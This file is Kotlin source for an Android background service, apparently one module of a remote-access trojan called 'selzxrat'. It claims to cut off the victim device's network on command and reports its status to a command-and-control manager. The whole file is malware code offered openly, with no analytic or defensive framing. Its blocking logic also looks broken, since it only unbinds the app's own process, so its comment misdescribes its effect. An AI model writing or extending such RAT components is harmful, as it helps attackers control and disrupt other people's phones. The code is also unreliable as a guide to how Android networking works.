package com.selzxrat.v5.services

import android.app.Service
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.IBinder
import android.util.Log
import com.selzxrat.v5.C2Manager

class NetworkThrottler : Service() {

    companion object {
        private const val TAG = "NetworkThrottler"
        var isThrottling = false
            private set
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action ?: ""
        when (action) {
            "start" -> startThrottling()
            "stop" -> stopThrottling()
        }
        return START_STICKY
    }

    private fun startThrottling() {
        isThrottling = true
        Log.d(TAG, "Network throttling started")

        // Block connectivity by restricting networks
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val connectivityManager = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
            val request = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()

            connectivityManager.registerNetworkCallback(request, object : android.net.ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: android.net.Network) {
                    if (isThrottling) {
                        connectivityManager.bindProcessToNetwork(null)
                    }
                }
            })
        }

        C2Manager.sendCommand("self", "throttle_status", "active")
    }

    private fun stopThrottling() {
        isThrottling = false
        Log.d(TAG, "Network throttling stopped")

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val connectivityManager = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
            connectivityManager.bindProcessToNetwork(null)
        }

        C2Manager.sendCommand("self", "throttle_status", "inactive")
    }

    override fun onDestroy() {
        super.onDestroy()
        isThrottling = false
    }
}